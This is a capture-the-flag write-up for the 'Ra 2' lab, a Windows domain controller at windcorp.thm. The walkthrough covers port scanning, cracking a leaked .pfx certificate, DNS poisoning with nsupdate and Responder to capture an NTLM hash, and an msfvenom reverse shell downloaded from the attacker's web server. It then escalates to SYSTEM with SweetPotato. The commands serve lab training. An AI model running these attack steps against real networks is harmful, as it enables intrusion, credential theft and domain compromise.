
# CTF Writeup: Ra 2

---
## Reconnaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -n -Pn -sS -p- 10.112.173.144
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-18 15:52 -0500
Nmap scan report for 10.112.173.144
Host is up (0.011s latency).
Not shown: 63300 filtered tcp ports (no-response), 2204 closed tcp ports (reset)
PORT      STATE SERVICE
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5222/tcp  open  xmpp-client
5223/tcp  open  hpvirtgrp
5229/tcp  open  jaxflow
5262/tcp  open  unknown
5263/tcp  open  unknown
5269/tcp  open  xmpp-server
5270/tcp  open  xmp
5275/tcp  open  unknown
5276/tcp  open  unknown
7070/tcp  open  realserver
7443/tcp  open  oracleas-https
7777/tcp  open  cbt
9090/tcp  open  zeus-admin
9091/tcp  open  xmltec-xmlmail
9389/tcp  open  adws
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49695/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 400.20 seconds
```

Another more detailled scan provided information about the running services.

```
nmap -n -Pn -sSCV -p 88,135,139,389,464,593,636,2179,3268,3269,5222,5223,5229,5262,5263,5269,5270,5275,5276,7070,7443,7777,9090,9091,9389,49666,49668,49669,49670,49673,49695 10.112.173.144
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-18 16:01 -0500
Nmap scan report for 10.112.173.144
Host is up (0.012s latency).

PORT      STATE SERVICE                VERSION
88/tcp    open  kerberos-sec           Microsoft Windows Kerberos (server time: 2026-07-18 21:01:27Z)
135/tcp   open  msrpc                  Microsoft Windows RPC
139/tcp   open  netbios-ssn            Microsoft Windows netbios-ssn
389/tcp   open  ldap                   Microsoft Windows Active Directory LDAP (Domain: windcorp.thm, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Not valid before: 2020-05-29T03:31:08
|_Not valid after:  2028-05-29T03:41:03
|_ssl-date: 2026-07-18T21:03:17+00:00; -2s from scanner time.
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http             Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap               Microsoft Windows Active Directory LDAP (Domain: windcorp.thm, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-18T21:03:17+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Not valid before: 2020-05-29T03:31:08
|_Not valid after:  2028-05-29T03:41:03
2179/tcp  open  vmrdp?
3268/tcp  open  ldap                   Microsoft Windows Active Directory LDAP (Domain: windcorp.thm, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-18T21:03:17+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Not valid before: 2020-05-29T03:31:08
|_Not valid after:  2028-05-29T03:41:03
3269/tcp  open  ssl/ldap               Microsoft Windows Active Directory LDAP (Domain: windcorp.thm, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-18T21:03:17+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Not valid before: 2020-05-29T03:31:08
|_Not valid after:  2028-05-29T03:41:03
5222/tcp  open  jabber
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|       version: 1.0
|     compression_methods: 
|     unknown: 
|     capabilities: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     features: 
|     stream_id: 38108xslyx
|_    auth_mechanisms: 
|_ssl-date: 2026-07-18T21:03:17+00:00; -2s from scanner time.
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5223/tcp  open  ssl/jabber
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
|_ssl-date: 2026-07-18T21:03:17+00:00; -2s from scanner time.
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|     compression_methods: 
|     capabilities: 
|     unknown: 
|     features: 
|     errors: 
|       (timeout)
|_    auth_mechanisms: 
5229/tcp  open  jaxflow?
5262/tcp  open  jabber
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|       version: 1.0
|     compression_methods: 
|     unknown: 
|     capabilities: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     features: 
|     stream_id: 1kqi6wbh9v
|_    auth_mechanisms: 
5263/tcp  open  ssl/jabber             Ignite Realtime Openfire Jabber server 3.10.0 or later
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|     compression_methods: 
|     capabilities: 
|     unknown: 
|     features: 
|     errors: 
|       (timeout)
|_    auth_mechanisms: 
|_ssl-date: 2026-07-18T21:03:17+00:00; -2s from scanner time.
5269/tcp  open  xmpp                   Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|     compression_methods: 
|     capabilities: 
|     unknown: 
|     features: 
|     errors: 
|       (timeout)
|_    auth_mechanisms: 
5270/tcp  open  ssl/xmp?
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
|_ssl-date: 2026-07-18T21:03:17+00:00; -2s from scanner time.
5275/tcp  open  jabber                 Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|       version: 1.0
|     compression_methods: 
|     unknown: 
|     capabilities: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     features: 
|     stream_id: 3zdwd778a
|_    auth_mechanisms: 
5276/tcp  open  ssl/jabber             Ignite Realtime Openfire Jabber server 3.10.0 or later
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|     compression_methods: 
|     capabilities: 
|     unknown: 
|     features: 
|     errors: 
|       (timeout)
|_    auth_mechanisms: 
|_ssl-date: 2026-07-18T21:03:17+00:00; -2s from scanner time.
7070/tcp  open  http                   Jetty 9.4.18.v20190429
|_http-title: Openfire HTTP Binding Service
|_http-server-header: Jetty(9.4.18.v20190429)
7443/tcp  open  ssl/http               Jetty 9.4.18.v20190429
|_ssl-date: 2026-07-18T21:03:17+00:00; -2s from scanner time.
|_http-server-header: Jetty(9.4.18.v20190429)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
|_http-title: Openfire HTTP Binding Service
7777/tcp  open  socks5                 (No authentication; connection not allowed by ruleset)
| socks-auth-info: 
|_  No authentication
9090/tcp  open  hadoop-tasktracker     Apache Hadoop
| hadoop-tasktracker-info: 
|_  Logs: jive-ibtn jive-btn-gradient
|_http-title: Site doesn't have a title (text/html).
| hadoop-datanode-info: 
|_  Logs: jive-ibtn jive-btn-gradient
9091/tcp  open  ssl/hadoop-tasktracker Apache Hadoop
|_http-title: Site doesn't have a title (text/html).
| hadoop-datanode-info: 
|_  Logs: jive-ibtn jive-btn-gradient
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
| hadoop-tasktracker-info: 
|_  Logs: jive-ibtn jive-btn-gradient
|_ssl-date: 2026-07-18T21:03:17+00:00; -2s from scanner time.
9389/tcp  open  mc-nmf                 .NET Message Framing
49666/tcp open  msrpc                  Microsoft Windows RPC
49668/tcp open  ncacn_http             Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc                  Microsoft Windows RPC
49670/tcp open  msrpc                  Microsoft Windows RPC
49673/tcp open  msrpc                  Microsoft Windows RPC
49695/tcp open  msrpc                  Microsoft Windows RPC
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5222-TCP:V=7.99%I=7%D=7/18%Time=6A5BE9BD%P=x86_64-pc-linux-gnu%r(RP
SF:CCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/s
SF:treams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stream
SF:s\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5223-TCP:V=7.99%T=SSL%I=7%D=7/18%Time=6A5BE9C9%P=x86_64-pc-linux-gn
SF:u%r(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\
SF:.org/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-
SF:streams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5262-TCP:V=7.99%I=7%D=7/18%Time=6A5BE9BD%P=x86_64-pc-linux-gnu%r(RP
SF:CCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/s
SF:treams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stream
SF:s\"/></stream:error></stream:stream>");
Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: ERROR: Script execution failed (use -d to debug)
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.59 seconds
```

The target is an Domain Controller and it reveals a lot of information about virtualhosts such as:

```
selfservice.windcorp.thm
selfservice.dev.windcorp.thm
fire.windcorp.thm
```

We also got provided the domainname as information "windcorp.thm" and a lot of information about xampp, jabber, jetty & apache hadoop.

Let's first of all map all the information we retrieved to the target ip in our local dns file, before proceeding.

```
echo "10.112.173.144 windcorp.thm selfservice.windcorp.thm selfservice.dev.windcorp.thm fire.windcorp.thm" | tee -a /etc/hosts
```

I started with checking out port 9090, since this is Apache Hadoop. We get greeted with an Admin Console and an "Openfire Version 4.5.1".

I googled for "OpenFire 4.5.1 Exploit GitHub" and found the following PoC, which basically allows us to bypass the authentication.

```
git clone https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT
```

Ran the exploit and it created credentials for me.

```
python3 CVE-2023-32315.py -u http://10.112.173.144:9090
```

```
hugme:HugmeNOW
```

Unfortunately it didn't work!

I started with accessing the previously discovered virtual hosts. 
Accessing the selfservice.dev.windcorp.thm subdomain was promising.

I decided to enumerate endpoint using "dirsearch" and found an /backup directory.

```
dirsearch -u https://selfservice.dev.windcorp.thm
```

Accessing the Backup Endpoint provided us with an .pfx file. Jackpot! We can extract information out of this file. I downloaded it onto my local machine.

An .pfx file is an bundle of certificates which are either used for webservers or remote authentication under windows. It stores the private key. If you crack the .pfx file you can utilize openssl to get the private key and authenticate remotely against the target.

I will start by converting the .pfx file to hash values. So I can bruteforce the key out of the pfx hash. I will utilize an tool called "pfx2john" for this case.

```
pf2john cert.pfx > pfx_hash
```

Since I now have the hash value I can bruteforce it using john the ripper.

```
john pfx_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Gained the key "ganteng". I then proceeded with extracting the certificate and private key using openssl out of the certificate itself.

```
openssl pkcs12 -in ../cert.pfx -nocerts -out key.pem -nodes
```

```
openssl pkcs12 -in ../cert.pfx -clcerts -nokeys -out key.cert
```

Since I now have both in file formats on my local machine, I can use them to authenticate against winrm via evil-winrm.

```
evil-winrm -i windcorp.thm -c key.cert -k key.pem -S
```

I tried to authenticate with xfreerdp3, but I was unsuccessfull.

```
xfreerdp3 /v:fire.windcorp.thm /d:windcorp.thm /u:"fire$" /smartcard-logon:cert:key.cert,key:key.pem /cert:ignore
```

I had to do a lot of research to proceed with everything. The first thing I did was enumerating endpoints on https://fire.windcorp.thm and found an /poweshell web endpoint. This can be an entry point, but we'll need credentials first.

```
gobuster dir -u https://fire.windcorp.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k 
```

I checked the DNS Entries and found the first flag in the TXT Entry.

```
dig @10.112.173.144 windcorp.thm -t TXT
```

The Flag itself could hint to DNS Poisoning, which relies on that DNS itself is running on UDP & not on TCP. Which means it doesn't check the authenticity of the source itself.

```
THM{Allowing nonsecure dynamic updates is a significant security vulnerability because updates can be accepted from untrusted sources}
```

We can perform an DNS Poisoning attack and potentially retrieve an NTLM Hash. The capturing itself will be via responder and we will utilize the retrieved certificate and private key to configure our responder, so we are actually able to trick the server that we are "authenticated". So we can capture the NTLM Hash.

1. We will add the key.pem and key.cert file into /usr/share/responder/certs

```
cp key.pem key.cert /usr/share/responder/certs
```

2. Modified the Responder.conf file

```
SSLCert = certs/key.cert
SSLKey = certs/key.pem
```

3. Utilized "nsupdate" to update the DNS Entry and to point it to our local machine ip. So we can capture the NTLM Hash with Responder

```
nsupdate
```

```
> server 10.112.173.144
> update delete selfservice.windcorp.thm
> send
> update add selfservice.windcorp.thm 1234 A 192.168.170.177
> send
> quit
```

4. Started up Responder

```
responder -I tun0
```

5. Reloaded Website fire.windcorp.thm and captured NTLM Hash of user "edwardle".

Stored it in an file locally and bruteforced an password utilizing john the ripper.

```
john edwardle --wordlist=/usr/share/wordlists/rockyou.txt
```

Gained new credentials.

```
edwardle:!Angelus25!
```

Before proceeding I will modify the Responder.conf again to point to the original .crt and .key file.

```
; Configure SSL Certificates to use
SSLCert = certs/responder.crt
SSLKey = certs/responder.key
```

I enumerated Shares using NXC and identified two non-default SMB Shares. "Shared" & "Users" SMB Share in which we got read permissions. Let's access and enumerate them.

The first share was empty & the Users Share had a lot of directories inside. I decided before enumerating all of this, to proceed with spraying rdp to check if we can connect to the target system. We can!

```
nxc rdp 10.112.173.144 -u edwardle -p '!Angelus25!'
```

Unfortunately when trying to connect via RDP it doesn't log us in, it says we do not have the permission. Let's try & login into the Powershell Web Interface at fire.windcorp.thm/powershell

We were able to login and now have an valid command execution on the target system!

I decided to get RCE by uploading an malicious shell.exe to the target system and executing it from the powershell web endpoint.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f -o shell.exe
```

I started up my python3 webserver in which the shell.exe payload is stored.

```
python3 -m http.server 80
```

On the /powershell endpoint I executed the following command in order to transfer my payload to the target system.

```
iwr -uri http://192.168.170.177/shell.exe -o shell.exe
```

Started up my listener on port 443.

```
rlwrap nc -lvnp 443
```

Executed the shell.exe payload in the /powershell web endpoint.

```
./shell.exe
```

Gained RCE as user "edwardle".

```
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.170.177] from (UNKNOWN) [10.112.173.144] 64079
Microsoft Windows [Version 10.0.17763.1158]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\edwardle.WINDCORP\Documents>
```

Retrieved Flag 2.txt in C:\Users\edwardle\Desktop.

```
THM{8a1d460dfe345f8edd09d45ae00e5c1c14d12c89}
```

## Privilege Escalation

My current user is part of the Account Operators Group, which we can leverage to elevate privileges, but also has the "SeImpersonatePrivilege" enabled. Let's first try and abuse the permission before trying to abuse the Account Operators Group.

```
iwr -uri http://192.168.170.177/PrintSpoofer.exe -o PrintSpoofer.exe
```

I also tried utilizing SweetPotato.exe, but this also didn't work 100% I was only able to perform the command "whoami", but the rest didn't worked out. So I will proceed with trying to abuse the fact that we are part of the Account Operators Group, which allows us to change credentials of user accounts.

Before I will try & find out which users actually exist and which users I can abuse to gain higher privileges. I will utilize bloodhound for this.

Started up bloodhound on my local machine:

```
neo4j console
bloodhound
```

Downloaded all domain information.

```
bloodhound-python -u edwardle -p '!Angelus25!' -ns 10.112.173.144 -d windcorp.thm -c all
```

Upon inspecting bloodhound on 127.0.0.1:9090 and uploading all domain information I realized that our current session "edwardle" already seems to be part of the Tier Zero. The Domain Admin of the DC is "vivimull78". Let's try & change her password, since we unfortunately aren't able to change the password of the Administrator user.

I tried to change the password of multiple users, but the access is denied.

```
net user vivimull78 Password123! /domain
```

I will try to utilize SweetPotato.exe again, because I found out that I have to specify payloads with -p which I didn't before.

Started up listener on port 443.

```
rlwrap nc -lvnp 443
```

Ran the following command on the /powershell web endpoint.

```
.\SweetPotato.exe -p .\shell.exe
```

Gained RCE as user "fire$".

```
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.170.177] from (UNKNOWN) [10.112.173.144] 56457
Microsoft Windows [Version 10.0.17763.1158]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
windcorp\fire$
```

Retrieved Flag 3 .txt in C:\Users\Administrator\Desktop.

```
THM{9a8b9f4f3af2bce68885106c1c8473ab85e0eda0}
```
